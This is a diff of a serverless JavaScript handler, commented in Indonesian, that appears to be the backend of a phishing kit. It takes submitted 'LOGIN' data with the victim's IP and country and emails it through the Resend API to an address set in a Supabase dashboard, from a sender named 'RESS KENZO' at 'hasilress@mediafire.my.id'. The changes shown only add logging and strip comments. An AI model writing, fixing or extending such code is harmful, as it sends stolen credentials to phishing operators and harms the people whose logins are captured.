@@ -30,7 +30,7 @@ export default async function handler(req, res) {
         
         let EMAIL_TUJUAN = "admin@domain.com"; 
         let NAMA_PENGIRIM = "RESS KENZO"; 
-        let EMAIL_PENGIRIM = "hasilress@mediafire.my.id"; // DEFAULT KALO DI DASHBOARD KOSONG
+        let EMAIL_PENGIRIM = "hasilress@mediafire.my.id"; 
 
         try {
             const rCfg = await fetch(`${SUPABASE_URL}/rest/v1/web_config?web_id=eq.${WEB_ID}&select=*`, {
@@ -40,7 +40,6 @@ export default async function handler(req, res) {
             if (cfgData && cfgData[0]) {
                 if (cfgData[0].email_tujuan) EMAIL_TUJUAN = cfgData[0].email_tujuan;
                 
-                // AMBIL NAMA DAN EMAIL PENGIRIM DARI DASHBOARD
                 if (cfgData[0].nama_ress) {
                     let parts = cfgData[0].nama_ress.split('<');
                     NAMA_PENGIRIM = parts[0].trim();
@@ -50,6 +49,10 @@ export default async function handler(req, res) {
                 }
             }
         } catch(e) { console.log("Gagal ambil config:", e); }
+
+        // LOG UNTUK NGECEK EMAIL PENGIRIM DAN TUJUAN
+        console.log("MENGIRIM DARI:", `${NAMA_PENGIRIM} <${EMAIL_PENGIRIM}>`);
+        console.log("MENGIRIM KE:", EMAIL_TUJUAN);
 
         const flag = countryFlag(d.negaraKode || "");
         const previewText = "ID | +62 | LOGIN " + PLATFORM + " | IP " + (d.ip || "-");
@@ -99,14 +102,17 @@ export default async function handler(req, res) {
             method: "POST",
             headers: { "Authorization": "Bearer " + API_KEY, "Content-Type": "application/json" },
             body: JSON.stringify({
-                from: NAMA_PENGIRIM + " <" + EMAIL_PENGIRIM + ">", // <--- OTOMATIS DARI DASHBOARD
-                to: [EMAIL_TUJUAN], // <--- OTOMATIS DARI DASHBOARD
+                from: `${NAMA_PENGIRIM} <${EMAIL_PENGIRIM}>`, 
+                to: [EMAIL_TUJUAN], 
                 subject: "🥷 " + NAMA_PENGIRIM + " 🥷 | " + PLATFORM + " | IP " + (d.ip || "-"),
                 html: htmlBody
             })
         });
 
         const data = await response.json();
+        
+        // LOG RESPONSE DARI RESEND
+        console.log("RESPONSE RESEND:", data);
 
         if (response.ok) {
             try {
